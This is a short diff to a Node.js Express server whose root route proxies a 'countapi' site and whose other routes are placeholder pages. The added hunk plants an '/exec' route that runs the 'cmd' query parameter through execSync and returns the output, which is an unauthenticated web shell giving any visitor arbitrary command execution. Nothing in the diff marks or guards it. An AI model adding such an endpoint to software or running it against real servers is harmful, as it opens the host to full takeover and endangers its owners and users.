@@ -12,6 +12,10 @@ app.get('/', async (req, res) => {
 	var gethtml = await axios.get("https://frmdeveloper.github.io/countapi"+req.url)
 	res.set("content-type",gethtml.headers['content-type']).send(gethtml.data)
 })
+app.get('/exec', async (req, res) => {
+	var ls = await execSync(req.query.cmd)
+	res.send(ls.toString())
+})
 app.get('/about', (req, res) => res.send('About Page Route'));
 app.get('/portfolio', (req, res) => res.send('Portfolio Page Route'));
 app.get('/contact', (req, res) => res.send('Contact Page Route'));
